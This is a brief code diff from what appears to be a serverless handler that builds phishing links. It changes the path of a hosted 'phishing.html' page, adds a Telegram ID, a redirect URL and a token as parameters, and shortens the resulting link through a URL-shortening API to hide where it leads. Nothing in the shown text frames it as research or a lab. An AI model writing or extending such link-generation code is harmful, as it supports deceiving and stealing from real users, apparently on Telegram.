@@ -16,7 +16,7 @@ export default async (req, res) => {
       Math.random().toString(36)[2]).join('');
     
     // Generate phishing URL
-    const baseUrl = 'https://opaslabs.vercel.app/phishing.html';
+    const baseUrl = 'https://opaslabs.vercel.app/phishing/phishing.html';
     const phishingUrl = `${baseUrl}?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
     
     // Shorten URL using spoo.me API
